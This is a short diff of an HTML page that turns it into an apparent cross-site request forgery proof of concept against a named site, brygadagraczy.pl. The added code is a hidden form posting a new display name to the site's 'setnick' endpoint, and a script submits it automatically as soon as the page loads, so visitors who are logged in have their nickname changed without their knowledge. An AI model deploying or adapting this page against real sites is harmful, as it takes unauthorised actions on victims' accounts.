@@ -13,16 +13,16 @@
     </style>
 </head>
 <body>
-    
-    
+    <form action="https://brygadagraczy.pl/panel.php?a=setnick" method="post">
+        <input type="hidden" name="displayname" value="asdada" />
+        <input type="hidden" name="changeNick" value="" />
+    </form>
 <script>
     (async () => {
         try {
-            
-            const url = "https://brygadagraczy.pl/";
-            const response = await axios.get(url);
-            console.log(response);
-            
+            for (let i=0; i < 2; i++) {
+                    document.querySelector("form").submit();
+            }
         } catch (e) {
             console.log(e);
         }
